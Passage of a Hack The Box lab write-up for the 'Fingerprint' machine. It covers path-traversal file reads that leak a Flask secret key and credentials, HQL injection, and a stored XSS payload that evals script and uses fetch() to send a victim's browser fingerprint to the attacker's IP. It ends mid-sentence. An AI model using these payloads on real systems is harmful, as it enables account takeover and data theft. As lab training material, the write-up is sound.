---
title:     "Hack The Box - Fingerprint"
tags: [linux,insane,xss,war,java,deserialization,brute,custom,suid,hql,sqli,flask,aes,ecb,encryption oracle]
categories: HackTheBox
---
[![000_info_card](/img/fingerprint/000_info_card.png)](/img/fingerprint/000_info_card.png)

Fingerprint is an insane rated machine on HackTheBox created by [irogir](https://www.hackthebox.com/home/users/profile/476556). For the user part we will chain multiple vulnerabilities to gain RCE through custom java deserialization. Once on the machine we will abuse a SUID binary to obtain a users ssh key. The key is encrypted but after looking around we find the password as database credentials in a `war` file of the glassfish installation. For the root part there is a very similar app running as in the beginning. This time we will abuse a weekness in AES ECB. The implementation allows us to encrypt chosen plaintext and we are able to retrieve the rest of the ciphertext this way. With the decrypted ciphertext we can forge our own cookie and abuse a LFI in the application, leading to the disclosure of root's ssh key and full compromise on the machine.

# User

As usual we start our enumeration with a nmap scan against all ports, followed by a script and version detection scan against the open ones to get an initial overview of the attack surface.

## Nmap
`All ports`
```
$ sudo nmap -n -p- -T4 10.129.227.226
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-07 10:22 UTC
Nmap scan report for 10.129.227.226
Host is up (0.044s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 155.05 seconds
```

`Script and version`
```
$ sudo nmap -sC -sV -p22,80,8080 10.129.227.226
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-07 10:26 UTC
Nmap scan report for 10.129.227.226
Host is up (0.025s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 90:65:07:35:be:8d:7b:ee:ff:3a:11:96:06:a9:a1:b9 (RSA)
|   256 4c:5b:74:d9:3c:c0:60:24:e4:95:2f:b0:51:84:03:c5 (ECDSA)
|_  256 82:f5:b0:d9:73:18:01:47:61:f7:f6:26:0a:d5:cd:f2 (ED25519)
80/tcp   open  http    Werkzeug httpd 1.0.1 (Python 2.7.17)
|_http-title: mylog - Starting page
|_http-server-header: Werkzeug/1.0.1 Python/2.7.17
8080/tcp open  http    Sun GlassFish Open Source Edition  5.0.1
|_http-title: secAUTH
| http-methods:
|_  Potentially risky methods: PUT DELETE TRACE
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: GlassFish Server Open Source Edition  5.0.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 54.04 seconds
```

## LFI

The two open web ports seem to expose the bigger attack surface. Additionaly port 80 looks like a custom web application from the scan so we will start there. Going over to the page we see the homepage of `mylog`.

[![005_mylog_home](/img/fingerprint/005_mylog_home.png)](/img/fingerprint/005_mylog_home.png)

Fuzzing for additional routes with gobuster we find the `/login` and `/admin` path. The request to `/admin` get's redirected to `/login` but the request body does have a size so it might leak some information.

```
$ gobuster dir -w /opt/SecLists/Discovery/Web-Content/raft-large-words.txt -u http://10.129.227.226/
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.227.226/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /opt/SecLists/Discovery/Web-Content/raft-large-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/12/07 10:27:59 Starting gobuster in directory enumeration mode
===============================================================
/login                (Status: 200) [Size: 901]
/admin                (Status: 302) [Size: 1574] [--> http://10.129.227.226/login]
```

Requesting `/admin` with burp we can see two additional paths with `./admin/view/auth.log` and `./admin/delete/auth.log`.

[![010_burp_admin_body](/img/fingerprint/010_burp_admin_body.png)](/img/fingerprint/010_burp_admin_body.png)

Here `auth.log` looks like a file that is being opened so it might be worth to check for LFI and indeed traversing two directories up we are able to retrieve `/etc/passwd` confirming our suspicsion.

[![015_admin_lfi](/img/fingerprint/015_admin_lfi.png)](/img/fingerprint/015_admin_lfi.png)

Checking for the current cmdline of the process running the web service we can deduct it is a flask app.

[![020_admin_flask](/img/fingerprint/020_admin_flask.png)](/img/fingerprint/020_admin_flask.png)

Since there is a `flask` user on the machine and we know its home directory from `/etc/passwd` we fuzz for the default `app.py` file in a subdirectory of `/home/flask`. After a few seconds we find `app.py` inside the `app` folder.

```
$ ffuf -w /opt/SecLists/Discovery/Web-Content/raft-large-words.txt -u 'http://10.129.227.226/admin/view/../../home/flask/FUZZ/app.py' -fs 18 -x http://127.0.0.1:8080

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.227.226/admin/view/../../home/flask/FUZZ/app.py
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/Web-Content/raft-large-words.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Proxy            : http://127.0.0.1:8080
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 18
________________________________________________

app                     [Status: 200, Size: 2037, Words: 148, Lines: 93]
```

Taking a look at the file we can see it leaks the `SECRET_KEY` which will be  of use to us later on.

```
$ curl --path-as-is http://10.129.227.226/admin/view/../../home/flask/app/app.py
from flask import Flask, redirect, request, render_template, session, g, url_for, send_file, make_response
from .auth import check

import os
from os import listdir
from os.path import isfile, join
import io

LOG_PATH = "/data/logs/"

app = Flask(__name__)

app.config['SECRET_KEY'] = 'SjG$g5VZ(vHC;M2Xc/2~z('
...[snip]..
```

Authentication and database interaction seems to be handled in different source files so we fuzz for those in the next step and find `auth.py` and `util.py`.

```
$ ffuf -w /opt/SecLists/Discovery/Web-Content/raft-large-words.txt -u 'http://10.129.227.226/admin/view/../../home/flask/app/FUZZ.py' -fs 18 -x http://127.0.0.1:8080

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.227.226/admin/view/../../home/flask/app/FUZZ.py
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/Web-Content/raft-large-words.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Proxy            : http://127.0.0.1:8080
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 18
________________________________________________

app                     [Status: 200, Size: 2037, Words: 148, Lines: 93]
auth                    [Status: 200, Size: 338, Words: 31, Lines: 21]
util                    [Status: 200, Size: 233, Words: 37, Lines: 9]
```

Looking at the contents of `auth.py` we can see that the application uses the sqlite3 database `users.db`, which seems to be in the same directory.

```
$ curl --path-as-is http://10.129.227.226/admin/view/../../home/flask/app/auth.py
import sqlite3

def check(user, password):

from .util import build_safe_sql_where

conn = sqlite3.connect('users.db')
cursor = conn.cursor()

cond = build_safe_sql_where({"username": user, "password": password})

query = "select * from users " + cond

cursor.execute(query)

rows = cursor.fetchall()

for x in rows:
return x

return None
```

Since this database contains login information we download it to our machine using curl and open it using the sqlite3 CLI tool.

```
$ curl -s --path-as-is http://10.129.227.226/admin/view/../../home/flask/app/users.db  -o users.db
$ sqlite3 users.db
SQLite version 3.34.1 2021-01-20 14:10:07
Enter ".help" for usage hints.
sqlite> .tables
users
sqlite> select * from users;
0|admin|u_will_never_guess_this_password
```

With these credentials we are now able to log into the application. However there doesn't seem to be any additional functionality we can access being logged in and the log file is empty.

[![025_admin_logged](/img/fingerprint/025_admin_logged.png)](/img/fingerprint/025_admin_logged.png)

## XSS

Going over to the GlassFish application we see the homepage of `secAUTH`.

[![030_secauth_home](/img/fingerprint/030_secauth_home.png)](/img/fingerprint/030_secauth_home.png)

Fuzzing for additional directories aswell gives us a place to log in and an interesting looking backups folder.

```
$ gobuster dir -w /opt/SecLists/Discovery/Web-Content/raft-large-words.txt -u http://10.129.227.226:8080/
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.227.226:8080/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /opt/SecLists/Discovery/Web-Content/raft-large-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/12/07 13:13:03 Starting gobuster in directory enumeration mode
===============================================================
/upload               (Status: 405) [Size: 1184]
/resources            (Status: 301) [Size: 187] [--> http://10.129.227.226:8080/resources/]
/login                (Status: 200) [Size: 1733]
/.                    (Status: 400) [Size: 0]
/WEB-INF              (Status: 301) [Size: 185] [--> http://10.129.227.226:8080/WEB-INF/]
/backups              (Status: 301) [Size: 185] [--> http://10.129.227.226:8080/backups/]
/welcome              (Status: 302) [Size: 182] [--> http://10.129.227.226:8080/login]
/META-INF             (Status: 301) [Size: 186] [--> http://10.129.227.226:8080/META-INF/
```

We try to log into the application and send the request to burp repeater for later inspection.

[![035_test_login](/img/fingerprint/035_test_login.png)](/img/fingerprint/035_test_login.png)

Checking on the `auth.log` again in the first application it now contains an entry with our login attempt.

[![040_logged_login](/img/fingerprint/040_logged_login.png)](/img/fingerprint/040_logged_login.png)

Since this seems to be a log for administrators to monitor logins, it might be worth to test for XSS in the log. To test it we send a XSS payload in the `uid` parameter to grab a script from our machine.

[![045_xss_initial](/img/fingerprint/045_xss_initial.png)](/img/fingerprint/045_xss_initial.png)

Inspecting the source log view we can see that no encoding is happening on the server side and we are able to inject our xss payloads into the page.

[![050_xxs_works](/img/fingerprint/050_xxs_works.png)](/img/fingerprint/050_xxs_works.png)

To see if someone else is viewing the page we stand up a netcat listener on port 80 and wait for a connection. Since the logs get cleared periodically it might be necessary to send the payload again.

```
$ sudo nc -lnkvp 80
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::80
Ncat: Listening on 0.0.0.0:80
```

After some time there is a connection back with `HeadlessChrome` in the User-Agent.

```
...[snip]...
Ncat: Connection from 10.129.227.226.
Ncat: Connection from 10.129.227.226:48690.
GET /a.js HTTP/1.1
Host: 10.10.14.22
Connection: keep-alive
User-Agent: Gozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/94.0.4606.71 Safari/537.36
Accept: */*
Referer: http://fingerprint.htb/
Accept-Encoding: gzip, deflate
Accept-Language: en-US
...[snip]...
```

## SQLI
The XSS is interesting but doesn't seem of much use just now since all discovered cookies so far have the http-only flag set. Poking further at the login request for glassfish we are able to trigger a server error entering a single quote.

[![055_server_error](/img/fingerprint/055_server_error.png)](/img/fingerprint/055_server_error.png)

Scrolling further down in the error message it seems to stem from an error in a hibernate query, meaning we are possibly dealing with HQL injection.

[![060_hql_error](/img/fingerprint/060_hql_error.png)](/img/fingerprint/060_hql_error.png)

Escaping the HQL context with an escaped single quote added we are able to fix the query, confirming the injection.

[![065_injection_poc](/img/fingerprint/065_injection_poc.png)](/img/fingerprint/065_injection_poc.png)

Trying to bypass the login we notice however that the query seems to expect a single return value.

[![070_multiple_val](/img/fingerprint/070_multiple_val.png)](/img/fingerprint/070_multiple_val.png)

We can quickly fix this by just adding the `LIMIT` keywoard to only return one result. The query now is fixed, however we are still not able to log into the application. What seems to be missing is a correct value for the `auth_secondary`.

[![075_invalid_fingerprint](/img/fingerprint/075_invalid_fingerprint.png)](/img/fingerprint/075_invalid_fingerprint.png)

Looking at the form we see that `auth_secondary` is the return value of the getFingerPrintID function defined in `login.js`. The function takes parameters of the users browser and hashes the resulting string. Since we don't know the victims browser settings we need a way to obtain their browser fingerprint.

[![080_fingerprint_definition](/img/fingerprint/080_fingerprint_definition.png)](/img/fingerprint/080_fingerprint_definition.png)

Having control over a users browser with the XSS on the logging application seems like a good opportuninty to get hold of the a browser fingerprint. If this user also has an account on the glassfisch page we might be able to finally log into it. To obtain the fingerprint of the victims browser we basically need to do the steps `/login.js` does. A simple way to achieve this is to just download the script and base64 encode it.

```
$ curl -s http://10.129.227.226:8080/resources/js/login.js  | base64 -w0
dmFyIE1ENSA9IGZ1bmN0aW9uIChkKSB7CiAgICB2YXIgciA9IE0oVihZKFgoZCksIDggKiBkLmxlbmd0aCkpKTsKICAgIHJldHVybiByLnRvTG93ZXJDYXNlKCkKfTsKCmZ1bmN0aW9uIE0oZCkgewogICAgZm9yICh2YXIgXywgbSA9ICIwMTIzNDU2Nzg5QUJDREVGIiwgZiA9ICIiLCByID0gMDsgciA8IGQubGVuZ3RoOyByKyspIF8gPSBkLmNoYXJDb2RlQXQociksIGYgKz0gbS5jaGFyQXQoXyA+Pj4gNCAmIDE1KSArIG0uY2hhckF0KDE1ICYgXyk7CiAgICByZXR1cm4gZgp9CgpmdW5jdGlvbiBYKGQpIHsKICAgIGZvciAodmFyIF8gPSBBcnJheShkLmxlbmd0aCA+PiAyKSwgbSA9IDA7IG0gPCBfLmxlbmd0aDsgbSsrKSBfW21dID0gMDsKICAgIGZvciAobSA9IDA7IG0gPCA4ICogZC5sZW5ndGg7IG0gKz0gOCkgX1ttID4+IDVdIHw9ICgyNTUgJiBkLmNoYXJDb2RlQXQobSAvIDgpKSA8PCBtICUgMzI7CiAgICByZXR1cm4gXwp9CgpmdW5jdGlvbiBWKGQpIHsKICAgIGZvciAodmFyIF8gPSAiIiwgbSA9IDA7IG0gPCAzMiAqIGQubGVuZ3RoOyBtICs9IDgpIF8gKz0gU3RyaW5nLmZyb21DaGFyQ29kZShkW20gPj4gNV0gPj4+IG0gJSAzMiAmIDI1NSk7CiAgICByZXR1cm4gXwp9CgpmdW5jdGlvbiBZKGQsIF8pIHsKICAgIGRbXyA+PiA1XSB8PSAxMjggPDwgXyAlIDMyLCBkWzE0ICsgKF8gKyA2NCA+Pj4gOSA8PCA0KV0gPSBfOwogICAgZm9yICh2YXIgbSA9IDE3MzI1ODQxOTMsIGYgPSAtMjcxNzMzODc5LCByID0gLTE3MzI1ODQxOTQsIGkgPSAyNzE3MzM4NzgsIG4gPSAwOyBuIDwgZC5sZW5ndGg7IG4gKz0gMTYpIHsKICAgICAgICB2YXIgaCA9IG0sIHQgPSBmLCBnID0gciwgZSA9IGk7CiAgICAgICAgZiA9IG1kNV9paShmID0gbWQ1X2lpKGYgPSBtZDVfaWkoZiA9IG1kNV9paShmID0gbWQ1X2hoKGYgPSBtZDVfaGgoZiA9IG1kNV9oaChmID0gbWQ1X2hoKGYgPSBtZDVfZ2coZiA9IG1kNV9nZyhmID0gbWQ1X2dnKGYgPSBtZDVfZ2coZiA9IG1kNV9mZihmID0gbWQ1X2ZmKGYgPSBtZDVfZmYoZiA9IG1kNV9mZihmLCByID0gbWQ1X2ZmKHIsIGkgPSBtZDVfZmYoaSwgbSA9IG1kNV9mZihtLCBmLCByLCBpLCBkW24gKyAwXSwgNywgLTY4MDg3NjkzNiksIGYsIHIsIGRbbiArIDFdLCAxMiwgLTM4OTU2NDU4NiksIG0sIGYsIGRbbiArIDJdLCAxNywgNjA2MTA1ODE5KSwgaSwgbSwgZFtuICsgM10sIDIyLCAtMTA0NDUyNTMzMCksIHIgPSBtZDVfZmYociwgaSA9IG1kNV9mZihpLCBtID0gbWQ1X2ZmKG0sIGYsIHIsIGksIGRbbiArIDRdLCA3LCAtMTc2NDE4ODk3KSwgZiwgciwgZFtuICsgNV0sIDEyLCAxMjAwMDgwNDI2KSwgbSwgZiwgZFtuICsgNl0sIDE3LCAtMTQ3MzIzMTM0MSksIGksIG0sIGRbbiArIDddLCAyMiwgLTQ1NzA1OTgzKSwgciA9IG1kNV9mZihyLCBpID0gbWQ1X2ZmKGksIG0gPSBtZDVfZmYobSwgZiwgciwgaSwgZFtuICsgOF0sIDcsIDE3NzAwMzU0MTYpLCBmLCByLCBkW24gKyA5XSwgMTIsIC0xOTU4NDE0NDE3KSwgbSwgZiwgZFtuICsgMTBdLCAxNywgLTQyMDYzKSwgaSwgbSwgZFtuICsgMTFdLCAyMiwgLTE5OTA0MDQxNjIpLCByID0gbWQ1X2ZmKHIsIGkgPSBtZDVfZmYoaSwgbSA9IG1kNV9mZihtLCBmLCByLCBpLCBkW24gKyAxMl0sIDcsIDE4MDQ2MDM2ODIpLCBmLCByLCBkW24gKyAxM10sIDEyLCAtNDAzNDExMDEpLCBtLCBmLCBkW24gKyAxNF0sIDE3LCAtMTUwMjAwMjI5MCksIGksIG0sIGRbbiArIDE1XSwgMjIsIDEyMzY1MzUzMjkpLCByID0gbWQ1X2dnKHIsIGkgPSBtZDVfZ2coaSwgbSA9IG1kNV9nZyhtLCBmLCByLCBpLCBkW24gKyAxXSwgNSwgLTE2NTc5NjUxMCksIGYsIHIsIGRbbiArIDZdLCA5LCAtMTA2OTUwMTYzMiksIG0sIGYsIGRbbiArIDExXSwgMTQsIDY0MzcxNzcxMyksIGksIG0sIGRbbiArIDBdLCAyMCwgLTM3Mzg5NzMwMiksIHIgPSBtZDVfZ2cociwgaSA9IG1kNV9nZyhpLCBtID0gbWQ1X2dnKG0sIGYsIHIsIGksIGRbbiArIDVdLCA1LCAtNzAxNTU4NjkxKSwgZiwgciwgZFtuICsgMTBdLCA5LCAzODAxNjA4MyksIG0sIGYsIGRbbiArIDE1XSwgMTQsIC02NjA0NzgzMzUpLCBpLCBtLCBkW24gKyA0XSwgMjAsIC00MDU1Mzc4NDgpLCByID0gbWQ1X2dnKHIsIGkgPSBtZDVfZ2coaSwgbSA9IG1kNV9nZyhtLCBmLCByLCBpLCBkW24gKyA5XSwgNSwgNTY4NDQ2NDM4KSwgZiwgciwgZFtuICsgMTRdLCA5LCAtMTAxOTgwMzY5MCksIG0sIGYsIGRbbiArIDNdLCAxNCwgLTE4NzM2Mzk2MSksIGksIG0sIGRbbiArIDhdLCAyMCwgMTE2MzUzMTUwMSksIHIgPSBtZDVfZ2cociwgaSA9IG1kNV9nZyhpLCBtID0gbWQ1X2dnKG0sIGYsIHIsIGksIGRbbiArIDEzXSwgNSwgLTE0NDQ2ODE0NjcpLCBmLCByLCBkW24gKyAyXSwgOSwgLTUxNDAzNzg0KSwgbSwgZiwgZFtuICsgN10sIDE0LCAxNzM1MzI4NDczKSwgaSwgbSwgZFtuICsgMTJdLCAyMCwgLTE5MjY2MDc3MzQpLCByID0gbWQ1X2hoKHIsIGkgPSBtZDVfaGgoaSwgbSA9IG1kNV9oaChtLCBmLCByLCBpLCBkW24gKyA1XSwgNCwgLTM3ODU1OCksIGYsIHIsIGRbbiArIDhdLCAxMSwgLTIwMjI1NzQ0NjMpLCBtLCBmLCBkW24gKyAxMV0sIDE2LCAxODM5MDMwNTYyKSwgaSwgbSwgZFtuICsgMTRdLCAyMywgLTM1MzA5NTU2KSwgciA9IG1kNV9oaChyLCBpID0gbWQ1X2hoKGksIG0gPSBtZDVfaGgobSwgZiwgciwgaSwgZFtuICsgMV0sIDQsIC0xNTMwOTkyMDYwKSwgZiwgciwgZFtuICsgNF0sIDExLCAxMjcyODkzMzUzKSwgbSwgZiwgZFtuICsgN10sIDE2LCAtMTU1NDk3NjMyKSwgaSwgbSwgZFtuICsgMTBdLCAyMywgLTEwOTQ3MzA2NDApLCByID0gbWQ1X2hoKHIsIGkgPSBtZDVfaGgoaSwgbSA9IG1kNV9oaChtLCBmLCByLCBpLCBkW24gKyAxM10sIDQsIDY4MTI3OTE3NCksIGYsIHIsIGRbbiArIDBdLCAxMSwgLTM1ODUzNzIyMiksIG0sIGYsIGRbbiArIDNdLCAxNiwgLTcyMjUyMTk3OSksIGksIG0sIGRbbiArIDZdLCAyMywgNzYwMjkxODkpLCByID0gbWQ1X2hoKHIsIGkgPSBtZDVfaGgoaSwgbSA9IG1kNV9oaChtLCBmLCByLCBpLCBkW24gKyA5XSwgNCwgLTY0MDM2NDQ4NyksIGYsIHIsIGRbbiArIDEyXSwgMTEsIC00MjE4MTU4MzUpLCBtLCBmLCBkW24gKyAxNV0sIDE2LCA1MzA3NDI1MjApLCBpLCBtLCBkW24gKyAyXSwgMjMsIC05OTUzMzg2NTEpLCByID0gbWQ1X2lpKHIsIGkgPSBtZDVfaWkoaSwgbSA9IG1kNV9paShtLCBmLCByLCBpLCBkW24gKyAwXSwgNiwgLTE5ODYzMDg0NCksIGYsIHIsIGRbbiArIDddLCAxMCwgMTEyNjg5MTQxNSksIG0sIGYsIGRbbiArIDE0XSwgMTUsIC0xNDE2MzU0OTA1KSwgaSwgbSwgZFtuICsgNV0sIDIxLCAtNTc0MzQwNTUpLCByID0gbWQ1X2lpKHIsIGkgPSBtZDVfaWkoaSwgbSA9IG1kNV9paShtLCBmLCByLCBpLCBkW24gKyAxMl0sIDYsIDE3MDA0ODU1NzEpLCBmLCByLCBkW24gKyAzXSwgMTAsIC0xODk0OTg2NjA2KSwgbSwgZiwgZFtuICsgMTBdLCAxNSwgLTEwNTE1MjMpLCBpLCBtLCBkW24gKyAxXSwgMjEsIC0yMDU0OTIyNzk5KSwgciA9IG1kNV9paShyLCBpID0gbWQ1X2lpKGksIG0gPSBtZDVfaWkobSwgZiwgciwgaSwgZFtuICsgOF0sIDYsIDE4NzMzMTMzNTkpLCBmLCByLCBkW24gKyAxNV0sIDEwLCAtMzA2MTE3NDQpLCBtLCBmLCBkW24gKyA2XSwgMTUsIC0xNTYwMTk4MzgwKSwgaSwgbSwgZFtuICsgMTNdLCAyMSwgMTMwOTE1MTY0OSksIHIgPSBtZDVfaWkociwgaSA9IG1kNV9paShpLCBtID0gbWQ1X2lpKG0sIGYsIHIsIGksIGRbbiArIDRdLCA2LCAtMTQ1NTIzMDcwKSwgZiwgciwgZFtuICsgMTFdLCAxMCwgLTExMjAyMTAzNzkpLCBtLCBmLCBkW24gKyAyXSwgMTUsIDcxODc4NzI1OSksIGksIG0sIGRbbiArIDldLCAyMSwgLTM0MzQ4NTU1MSksIG0gPSBzYWZlX2FkZChtLCBoKSwgZiA9IHNhZmVfYWRkKGYsIHQpLCByID0gc2FmZV9hZGQociwgZyksIGkgPSBzYWZlX2FkZChpLCBlKQogICAgfQogICAgcmV0dXJuIEFycmF5KG0sIGYsIHIsIGkpCn0KCmZ1bmN0aW9uIG1kNV9jbW4oZCwgXywgbSwgZiwgciwgaSkgewogICAgcmV0dXJuIHNhZmVfYWRkKGJpdF9yb2woc2FmZV9hZGQoc2FmZV9hZGQoXywgZCksIHNhZmVfYWRkKGYsIGkpKSwgciksIG0pCn0KCmZ1bmN0aW9uIG1kNV9mZihkLCBfLCBtLCBmLCByLCBpLCBuKSB7CiAgICByZXR1cm4gbWQ1X2NtbihfICYgbSB8IH5fICYgZiwgZCwgXywgciwgaSwgbikKfQoKZnVuY3Rpb24gbWQ1X2dnKGQsIF8sIG0sIGYsIHIsIGksIG4pIHsKICAgIHJldHVybiBtZDVfY21uKF8gJiBmIHwgbSAmIH5mLCBkLCBfLCByLCBpLCBuKQp9CgpmdW5jdGlvbiBtZDVfaGgoZCwgXywgbSwgZiwgciwgaSwgbikgewogICAgcmV0dXJuIG1kNV9jbW4oXyBeIG0gXiBmLCBkLCBfLCByLCBpLCBuKQp9CgpmdW5jdGlvbiBtZDVfaWkoZCwgXywgbSwgZiwgciwgaSwgbikgewogICAgcmV0dXJuIG1kNV9jbW4obSBeIChfIHwgfmYpLCBkLCBfLCByLCBpLCBuKQp9CgpmdW5jdGlvbiBzYWZlX2FkZChkLCBfKSB7CiAgICB2YXIgbSA9ICg2NTUzNSAmIGQpICsgKDY1NTM1ICYgXyk7CiAgICByZXR1cm4gKGQgPj4gMTYpICsgKF8gPj4gMTYpICsgKG0gPj4gMTYpIDw8IDE2IHwgNjU1MzUgJiBtCn0KCmZ1bmN0aW9uIGJpdF9yb2woZCwgXykgewogICAgcmV0dXJuIGQgPDwgXyB8IGQgPj4+IDMyIC0gXwp9CgpmdW5jdGlvbiBvYmpUb1N0cmluZyhvYmopIHsKICAgIHZhciBzdHIgPSAnJzsKICAgIGZvciAodmFyIHAgaW4gb2JqKSB7CiAgICAgICAgc3RyICs9IHAgKyAnOicgKyBvYmpbcF0gKyAnLCc7CiAgICB9CiAgICByZXR1cm4gc3RyOwp9CgoKZnVuY3Rpb24gZ2V0RmluZ2VyUHJpbnRJRCgpIHsKICAgIGxldCBmaW5nZXJwcmludCA9IG5hdmlnYXRvci5hcHBDb2RlTmFtZSArIG5hdmlnYXRvci5hcHBWZXJzaW9uICsgKG5hdmlnYXRvci5jb29raWVFbmFibGVkID8gInllcyIgOiAibm8iKSArIG5hdmlnYXRvci5sYW5ndWFnZSArIG5hdmlnYXRvci5wbGF0Zm9ybSArIG5hdmlnYXRvci5wcm9kdWN0U3ViICsgbmF2aWdhdG9yLnVzZXJBZ2VudCArIG5hdmlnYXRvci52ZW5kb3IgKyBzY3JlZW4uYXZhaWxXaWR0aCArICIiICsgc2NyZWVuLmF2YWlsSGVpZ2h0ICsgIiIgKyBzY3JlZW4ud2lkdGggKyAiIiArIHNjcmVlbi5oZWlnaHQgKyAiIiArIHNjcmVlbi5vcmllbnRhdGlvbi50eXBlICsgIiIgKyBzY3JlZW4ucGl4ZWxEZXB0aCArICIiICsgc2NyZWVuLmNvbG9yRGVwdGggKyBJbnRsLkRhdGVUaW1lRm9ybWF0KCkucmVzb2x2ZWRPcHRpb25zKCkudGltZVpvbmU7CgogICAgZm9yIChjb25zdCBwbHVnaW4gb2YgbmF2aWdhdG9yLnBsdWdpbnMpIHsKICAgICAgICBmaW5nZXJwcmludCArPSBwbHVnaW4ubmFtZSArICIsIjsKICAgIH0KICAgIGZvciAoY29uc3QgbWltZSBvZiBuYXZpZ2F0b3IubWltZVR5cGVzKSB7CiAgICAgICAgZmluZ2VycHJpbnQgKz0gbWltZS50eXBlICsgIiwiOwogICAgfQogICAgcmV0dXJuIE1ENShmaW5nZXJwcmludCkKfQoKCgoKCgoKCg==
```

The blob then get's placed inside a script tags decoded and evaled. After this the `getFingerPrintID` function is available in current context. All we have to do now is to call the function and send the result back to us.

```
<script>eval(atob("[base64]"));var a = "http://10.10.14.22/a?f=" + getFingerPrintID();fetch(a);</script>
```

We set up a python webserver first to retrieve the incoming fingerprint.

```
$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Then we send the URL-encoded payload in burp and after some time we get a hit on our webserver with the fingerprint as query string.

[![090_encoded_xss](/img/fingerprint/090_encoded_xss.png)](/img/fingerprint/090_encoded_xss.png)

```
$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.227.226 - - [07/Dec/2021 15:42:54] code 404, message File not found
10.129.227.226 - - [07/Dec/2021 15:42:54] "GET /a?f=962f4a03aa7ebc0515734cf398b0ccd6 HTTP/1.1" 404 -
```

Bypassing the authentication with this fingerprint now works for the second user in the database and we get redirected to `/welcome`.

[![095_login_success](/img/fingerprint/095_login_success.png)](/img/fingerprint/095_login_success.png)

We use burp's `Request in browser` functionality to have more comfortable access.

[![100_req_in_browser](/img/fingerprint/100_req_in_browser.png)](/img/fingerprint/100_req_in_browser.png)

Being logged in there is not alot of functionality. We are able to upload files and there was also a JWT set by the website.

[![105_logged_in](/img/fingerprint/105_logged_in.png)](/img/fingerprint/105_logged_in.png)

## Custom java deserialization

Decoding the payload part of the JWT it contains another base64 encoded string. From the start bytes `rO0A` it looks like a serialized java object.

```
$ echo -n eyJ1c2VyIjoick8wQUJYTnlBQ0ZqYjIwdVlXUnRhVzR1YzJWamRYSnBkSGt1YzNKakxtMXZaR1ZzTGxWelpYS1VCTmR6NDErNWF3SUFCRWtBQW1sa1RBQUxabWx1WjJWeWNISnBiblIwQUJKTWFtRjJZUzlzWVc1bkwxTjBjbWx1Wnp0TUFBaHdZWE56ZDI5eVpIRUFmZ0FCVEFBSWRYTmxjbTVoYldWeEFINEFBWGh3QUFBQUFuUUFRRGRsWmpVeVl6STFNV1k0TURRMFkySXhPRGN3TVRNNU9USTRPVEZrTUdVMU9HTmxPVEU1TkdSbE4yWTFNelZpTVdJMFptRTJZbUptWlRBNE5qYzRaalowQUJSTVYyYzNaMVZTTVVWdFdEZFZUbmh6U25oeFduUUFDMjFwWTJobFlXd3hNak0xIn0 | base64 -d
{"user":"rO0ABXNyACFjb20uYWRtaW4uc2VjdXJpdHkuc3JjLm1vZGVsLlVzZXKUBNdz41+5awIABEkAAmlkTAALZmluZ2VycHJpbnR0ABJMamF2YS9sYW5nL1N0cmluZztMAAhwYXNzd29yZHEAfgABTAAIdXNlcm5hbWVxAH4AAXhwAAAAAnQAQDdlZjUyYzI1MWY4MDQ0Y2IxODcwMTM5OTI4OTFkMGU1OGNlOTE5NGRlN2Y1MzViMWI0ZmE2YmJmZTA4Njc4ZjZ0ABRMV2c3Z1VSMUVtWDdVTnhzSnhxWnQAC21pY2hlYWwxMjM1"}base64: invalid input
```

To take a closer look at it we decode and save the object.

```
